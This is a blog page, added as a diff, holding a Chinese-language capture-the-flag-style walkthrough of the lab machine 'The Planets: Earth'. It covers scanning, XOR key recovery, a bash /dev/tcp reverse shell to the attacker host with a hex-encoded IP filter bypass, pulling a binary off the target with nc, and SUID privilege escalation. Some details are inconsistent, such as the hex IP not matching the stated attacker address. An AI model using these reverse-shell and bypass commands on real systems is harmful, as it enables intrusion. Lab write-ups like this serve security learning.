@@ -1,0 +1,522 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 7.3.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"example.com","root":"/","scheme":"Muse","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
+  </script>
+
+  <meta name="description" content="第一个渗透靶机，写详细一点 kali攻击机IP：192.168.16.128">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Vulhub靶机The Planets: Earth">
+<meta property="og:url" content="http://example.com/2023/07/08/Vulhub%E9%9D%B6%E6%9C%BAThe-Planets-Earth/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="第一个渗透靶机，写详细一点 kali攻击机IP：192.168.16.128">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://ilikeoyt.github.io/image/earth1.png">
+<meta property="og:image" content="https://ilikeoyt.github.io/image/earth2.png">
+<meta property="og:image" content="https://ilikeoyt.github.io/image/earth3.png">
+<meta property="og:image" content="https://ilikeoyt.github.io/image/earth4.png">
+<meta property="og:image" content="https://ilikeoyt.github.io/image/earth5.png">
+<meta property="og:image" content="https://ilikeoyt.github.io/image/earth6.png">
+<meta property="og:image" content="https://ilikeoyt.github.io/image/earth8.png">
+<meta property="og:image" content="https://ilikeoyt.github.io/image/earth9.png">
+<meta property="og:image" content="https://ilikeoyt.github.io/image/earth10.png">
+<meta property="og:image" content="https://ilikeoyt.github.io/image/earth11.png">
+<meta property="og:image" content="https://ilikeoyt.github.io/image/earth12.png">
+<meta property="og:image" content="https://ilikeoyt.github.io/image/earth13.png">
+<meta property="og:image" content="https://ilikeoyt.github.io/image/earth14.png">
+<meta property="og:image" content="https://ilikeoyt.github.io/image/earth15.png">
+<meta property="og:image" content="https://ilikeoyt.github.io/image/earth16.png">
+<meta property="og:image" content="https://ilikeoyt.github.io/image/earth15.png">
+<meta property="og:image" content="https://ilikeoyt.github.io/image/earth19.png">
+<meta property="og:image" content="https://ilikeoyt.github.io/image/earth20.png">
+<meta property="og:image" content="https://ilikeoyt.github.io/image/earth.png">
+<meta property="article:published_time" content="2023-07-08T03:19:57.000Z">
+<meta property="article:modified_time" content="2025-05-25T03:47:04.621Z">
+<meta property="article:author" content="John Doe">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://ilikeoyt.github.io/image/earth1.png">
+
+<link rel="canonical" href="http://example.com/2023/07/08/Vulhub%E9%9D%B6%E6%9C%BAThe-Planets-Earth/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>Vulhub靶机The Planets: Earth | Hexo</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">Hexo</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>
+
+  </li>
+  </ul>
+</nav>
+
+
+
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2023/07/08/Vulhub%E9%9D%B6%E6%9C%BAThe-Planets-Earth/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="John Doe">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Hexo">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          Vulhub靶机The Planets: Earth
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2023-07-08 11:19:57" itemprop="dateCreated datePublished" datetime="2023-07-08T11:19:57+08:00">2023-07-08</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2025-05-25 11:47:04" itemprop="dateModified" datetime="2025-05-25T11:47:04+08:00">2025-05-25</time>
+              </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <p>第一个渗透靶机，写详细一点</p>
+<p>kali攻击机IP：192.168.16.128</p>
+<span id="more"></span>
+
+<h2 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h2><p>首先登录进去，发现需要登录密码</p>
+<p><img src="https://ilikeoyt.github.io/image/earth1.png" alt="img"></p>
+<p>由于靶机和攻击机是在同一网段，使用arp-scan -l命令即可</p>
+<p><code>arp-scan -l</code>命令用于执行本地局域网的ARP扫描，并列出扫描到的活动主机（设备）的IP地址和MAC地址。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">ARP（Address Resolution Protocol）是一种用于在IPv4网络中将IP地址映射到物理MAC地址的协议。</span><br><span class="line"></span><br><span class="line">在一个局域网（LAN）上，每个设备通常由唯一的MAC地址标识。而在进行网络通信时，使用的是IP地址。ARP协议充当了这两种地址之间的桥梁。</span><br><span class="line"></span><br><span class="line">当设备需要将数据包发送到目标设备时，它首先会检查自己的ARP缓存表，看是否已经有目标设备的IP地址对应的MAC地址。如果没有，它会发送一个广播（ARP请求）来询问整个局域网中的其他设备，以获取目标设备的MAC地址。只有具有匹配IP地址的设备才会响应，将其自己的MAC地址告知请求设备（ARP应答）。一旦发送设备收到了目标设备的MAC地址，就可以将数据包发送到正确的物理地址上。</span><br><span class="line"></span><br><span class="line">ARP是一个基础的网络协议，它使得在局域网上的设备能够互相通信。它的工作原理简单但有效，对于建立和维护局域网上设备之间的连接至关重要。</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://ilikeoyt.github.io/image/earth2.png" alt="img"></p>
+<p>接着对目标主机进行端口扫描</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -A -p 1-65535 192.168.16.136</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><code>-A</code>: 使用”全面扫描”选项，包括操作系统版本检测、服务版本检测、脚本扫描等。</li>
+<li><code>-p 1-65535</code>: 指定要扫描的端口范围。这里指定了从端口1到端口65535的全部端口范围。</li>
+</ul>
+<p><img src="https://ilikeoyt.github.io/image/earth3.png" alt="img"></p>
+<p>可以看到有个433端口有个DNS解析，在本机hosts文件添加DNS解析，以能够访问</p>
+<p><img src="https://ilikeoyt.github.io/image/earth4.png" alt="img"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">在Windows下，先在Windows写一个DNS解析</span><br><span class="line"></span><br><span class="line">以管理员身份打开记事本，C:\Windows\System32\drivers\etc\hosts文件</span><br><span class="line"></span><br><span class="line">添加192.168.16.136 terratest.earth.local即可</span><br></pre></td></tr></table></figure>
+
+<p>现在访问一下<a target="_blank" rel="noopener" href="http://terratest.earth.local/">http://terratest.earth.local/</a></p>
+<p><img src="https://ilikeoyt.github.io/image/earth5.png" alt="img"></p>
+<p>如果是访问IP地址的话会出现400错误，因为重定向问题：某些网站或应用程序可能会对IP地址进行重定向，将请求重定向到与域名相关的特定URL。如果您直接使用IP地址进行访问，可能会绕过这个重定向过程，导致400错误。</p>
+<p>然后扫一下目录</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dirb http://terratest.earth.local/</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://ilikeoyt.github.io/image/earth6.png" alt="img"></p>
+<p>访问&#x2F;admin路由</p>
+<p><img src="https://ilikeoyt.github.io/image/earth8.png" alt="img"></p>
+<p>进去是一个登录页面</p>
+<p><img src="https://ilikeoyt.github.io/image/earth9.png" alt="img"></p>
+<p>简单爆破一下，没啥用</p>
+<p>再扫一下<a target="_blank" rel="noopener" href="https://terratest.earth.local/">https://terratest.earth.local/</a></p>
+<p><img src="https://ilikeoyt.github.io/image/earth10.png" alt="img"></p>
+<p>发现一个robots.txt</p>
+<p><img src="https://ilikeoyt.github.io/image/earth11.png" alt="img"></p>
+<p>有个&#x2F;testingnotes文件，但是后缀不知道，一个一个尝试，发现是.txt后缀，得到如下信息</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">Testing secure messaging system notes:</span><br><span class="line">*Using XOR encryption as the algorithm, should be safe as used in RSA.</span><br><span class="line">*Earth has confirmed they have received our sent messages.</span><br><span class="line">*testdata.txt was used to test encryption.</span><br><span class="line">*terra used as username for admin portal.</span><br><span class="line">Todo:</span><br><span class="line">*How do we send our monthly keys to Earth securely? Or should we change keys weekly?</span><br><span class="line">*Need to test different key lengths to protect against bruteforce. How long should the key be?</span><br><span class="line">*Need to improve the interface of the messaging interface and the admin panel, it&#x27;s currently very basic.</span><br></pre></td></tr></table></figure>
+
+<p>翻译如下</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">测试安全消息系统备注：</span><br><span class="line"></span><br><span class="line">使用异或（XOR）加密算法，应与RSA中使用的相同安全。</span><br><span class="line">地球方已经确认收到了我们发送的消息。</span><br><span class="line">使用 testdata.txt 文件进行加密测试。</span><br><span class="line">terra 作为管理员门户的用户名。 </span><br><span class="line">待办事项：</span><br><span class="line">我们应该如何安全地将每月的密钥发送给地球？或者我们应该每周更换密钥？</span><br><span class="line">需要测试不同的密钥长度以防止暴力破解。密钥的长度应该是多少？</span><br><span class="line">需要改进消息界面和管理员面板的界面，目前非常基础。</span><br></pre></td></tr></table></figure>
+
+<p>提到了testdata.txt文件，访问一下</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">According to radiometric dating estimation and other evidence, Earth formed over 4.5 billion years ago. Within the first billion years of Earth&#x27;s history, life appeared in the oceans and began to affect Earth&#x27;s atmosphere and surface, leading to the proliferation of anaerobic and, later, aerobic organisms. Some geological evidence indicates that life may have arisen as early as 4.1 billion years ago.</span><br></pre></td></tr></table></figure>
+
+<p>分析一下已有的信息</p>
+<p>在该文件中发现了以下信息：</p>
+<p>1、用户名信息：terra used as username for admin portal，用户名terra是超级管理员账户。</p>
+<p>2、加密算法：Using XOR encryption as the algorithm, should be safe as used in RSA，加密算法XOR。</p>
+<p>3、加密文本：testdata.txt was used to test encryption，测试数据在testdata.txt中。</p>
+<p>xor算法：a^b&#x3D;c，则c^b&#x3D;a或c^a&#x3D;b，所以我们就需要将发送得信息与密码本信息进行异或，得到原来发送得未加密得信息。</p>
+<h2 id="破解密钥"><a href="#破解密钥" class="headerlink" title="破解密钥"></a>破解密钥</h2><p>testdata.txt是明文，密文在最开始那个页面，所以我们可以利用这两个数据得到密钥</p>
+<p>编写脚本</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">import binascii</span><br><span class="line"></span><br><span class="line">entry_str = &#x27;2402111b1a0705070a41000a431a000a0e0a0f04104601164d050f070c0f15540d1018000000000c0c06410f0901420e105c0d074d04181a01041c170d4f4c2c0c13000d430e0e1c0a0006410b420d074d55404645031b18040a03074d181104111b410f000a4c41335d1c1d040f4e070d04521201111f1d4d031d090f010e00471c07001647481a0b412b1217151a531b4304001e151b171a4441020e030741054418100c130b1745081c541c0b0949020211040d1b410f090142030153091b4d150153040714110b174c2c0c13000d441b410f13080d12145c0d0708410f1d014101011a050d0a084d540906090507090242150b141c1d08411e010a0d1b120d110d1d040e1a450c0e410f090407130b5601164d00001749411e151c061e454d0011170c0a080d470a1006055a010600124053360e1f1148040906010e130c00090d4e02130b05015a0b104d0800170c0213000d104c1d050000450f01070b47080318445c090308410f010c12171a48021f49080006091a48001d47514c50445601190108011d451817151a104c080a0e5a&#x27;</span><br><span class="line">pass_txt = &quot;According to radiometric dating estimation and other evidence, Earth formed over 4.5 billion years ago. Within the first billion years of Earth&#x27;s history, life appeared in the oceans and began to affect Earth&#x27;s atmosphere and surface, leading to the proliferation of anaerobic and, later, aerobic organisms. Some geological evidence indicates that life may have arisen as early as 4.1 billion years ago.&quot;</span><br><span class="line">#将pass_txt转换成16进制</span><br><span class="line">pass_txt_16 = binascii.b2a_hex(pass_txt.encode(encoding=&quot;utf-8&quot;)).decode(&#x27;utf-8&#x27;).replace(&quot;b&#x27;&quot;,&#x27;&#x27;)</span><br><span class="line">#进行xor运算</span><br><span class="line">result = hex(int(entry_str,16)^int(pass_txt_16,16)).replace(&#x27;0x&#x27;,&#x27;&#x27;)</span><br><span class="line">#将运算结果转换成字符串</span><br><span class="line">datatext = binascii.unhexlify(result).decode(&#x27;utf-8&#x27;)</span><br><span class="line">print(datatext)</span><br></pre></td></tr></table></figure>
+
+<p>得到密钥：earthclimatechangebad4humans的重复输出</p>
+<p>利用terra和earthclimatechangebad4humans登录</p>
+<p><img src="https://ilikeoyt.github.io/image/earth12.png" alt="img"></p>
+<h2 id="获取user-flag"><a href="#获取user-flag" class="headerlink" title="获取user_flag"></a>获取user_flag</h2><p>可以直接执行命令</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -name &quot;*flag*&quot;</span><br></pre></td></tr></table></figure>
+
+<p>从根目录开始寻找文件名包含flag的文件</p>
+<p>发现一个&#x2F;var&#x2F;earth_web&#x2F;user_flag.txt，cat一下即可得到user的flag</p>
+<p>还需要password的flag，反弹shell吧</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash -i &gt;&amp; /dev/tcp/192.168.16.128/9999 0&gt;&amp;1</span><br></pre></td></tr></table></figure>
+
+<p>显示远程连接已经被禁止，使用16进制编码绕过</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash -i &gt;&amp; /dev/tcp/0xc0.0xa8.0x70.0x82/9999 0&gt;&amp;1</span><br></pre></td></tr></table></figure>
+
+<p>成功连接</p>
+<p><img src="https://ilikeoyt.github.io/image/earth13.png" alt="img"></p>
+<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>查找具有权限的命令</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -perm -u=s -type f 2&gt;/dev/null</span><br></pre></td></tr></table></figure>
+
+<p>该命令可以在文件系统中搜索具有设置了 Setuid 权限的可执行文件。具有 Setuid 权限的可执行文件，当普通用户执行时，可以获得与拥有者（通常是 root 用户）相同的权限。</p>
+<p>命令：<code>find / -perm -u=s -type f 2&gt;/dev/null</code></p>
+<p>解释：</p>
+<ul>
+<li><code>find</code>：用于搜索文件系统中符合条件的文件。</li>
+<li><code>/</code>：指定搜索路径为根目录，即从整个文件系统开始搜索。</li>
+<li><code>-perm -u=s</code>：表示要搜索的文件权限，这里的 <code>-perm</code> 表示按照权限进行匹配，<code>-u</code> 表示用户级别权限，<code>s</code> 表示 Setuid 权限。</li>
+<li><code>-type f</code>：表示只搜索普通文件。</li>
+<li><code>2&gt;/dev/null</code>：将标准错误输出重定向到 <code>/dev/null</code>，以避免显示不必要的错误信息。</li>
+</ul>
+<p>获得以下结果：</p>
+<p><img src="https://ilikeoyt.github.io/image/earth14.png" alt="img"></p>
+<p>发现有个&#x2F;usr&#x2F;bin&#x2F;reset_root，感觉可以提权，查看一下：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">strings /usr/bin/reset_root</span><br></pre></td></tr></table></figure>
+
+<p><code>strings</code> 命令用于显示二进制文件中可打印的字符串。</p>
+<p>其中这段代码值得注意一下：</p>
+<p><img src="https://ilikeoyt.github.io/image/earth15.png" alt="img"></p>
+<p>使用管道操作符 <code>|</code> 将输出的用户名和密码传递给 <code>/usr/sbin/chpasswd</code> 命令来重置 root 的密码。具体来说，它将用户名设置为 “root”，密码设置为 “Earth”。</p>
+<p>尝试直接运行一下</p>
+<p><img src="https://ilikeoyt.github.io/image/earth16.png" alt="img"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">正在检查是否存在重置触发器... </span><br><span class="line">重置失败，所有的触发器都不存在。</span><br></pre></td></tr></table></figure>
+
+<p>不知道是哪里出问题了，尝试使用strace命令进行调试，但是靶机上并没有strace命令，使用nc传到本机上</p>
+<p>靶机上的shell执行：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc 192.168.112.130 1234 &lt; /usr/bin/reset_root</span><br></pre></td></tr></table></figure>
+
+<p>本机执行：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nv -lvnp 1234 &gt; reset_root</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://ilikeoyt.github.io/image/earth15.png" alt="img"></p>
+<p>这样就把靶机的命令传入了本机</p>
+<p>使用strace进行调试（记得给文件赋予可执行权限）</p>
+<p><img src="https://ilikeoyt.github.io/image/earth19.png" alt="img"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">access(&quot;/dev/shm/kHgTFI5G&quot;, F_OK)       = -1 ENOENT (没有那个文件或目录)</span><br><span class="line">access(&quot;/dev/shm/Zw7bV9U5&quot;, F_OK)       = -1 ENOENT (没有那个文件或目录)</span><br><span class="line">access(&quot;/tmp/kcM0Wewe&quot;, F_OK)           = -1 ENOENT (没有那个文件或目录)</span><br></pre></td></tr></table></figure>
+
+<p>没有相关文件的原因，那么我们就在靶机上创建相关文件</p>
+<p><img src="https://ilikeoyt.github.io/image/earth20.png" alt="img"></p>
+<p>然后执行相关命令即可获得root_flag</p>
+<p><img src="https://ilikeoyt.github.io/image/earth.png" alt="img"></p>
+<p>收工！</p>
+<p><a target="_blank" rel="noopener" href="https://ilikeoyt.github.io/2023/06/29/%E8%AE%B0%E5%BD%95%E4%B8%80%E6%AC%A1kali%E5%BC%82%E5%B8%B8%E6%B2%A1%E7%BD%91%E7%9A%84%E8%A7%A3%E5%86%B3%E5%8A%9E%E6%B3%95/"> 记录一次kali异常没网的解决办法</a></p>
+<p><a target="_blank" rel="noopener" href="https://ilikeoyt.github.io/2023/07/08/DC-1/">DC-1 </a></p>
+<p>© 2024 ycxlo</p>
+<p>Powered by <a target="_blank" rel="noopener" href="https://hexo.io/">Hexo</a> &amp; <a target="_blank" rel="noopener" href="https://muse.theme-next.org/">NexT.Muse</a></p>
+
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2023/07/08/DC-1/" rel="prev" title="DC-1">
+      <i class="fa fa-chevron-left"></i> DC-1
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/2023/07/13/java-cc%E9%93%BE1/" rel="next" title="java_cc链1">
+      java_cc链1 <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86"><span class="nav-number">1.</span> <span class="nav-text">信息搜集</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%A0%B4%E8%A7%A3%E5%AF%86%E9%92%A5"><span class="nav-number">2.</span> <span class="nav-text">破解密钥</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E8%8E%B7%E5%8F%96user-flag"><span class="nav-number">3.</span> <span class="nav-text">获取user_flag</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%8F%90%E6%9D%83"><span class="nav-number">4.</span> <span class="nav-text">提权</span></a></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">John Doe</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">57</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+  </nav>
+</div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2025</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">John Doe</span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://muse.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Muse</a> 强力驱动
+  </div>
+
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/muse.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+</body>
+</html>
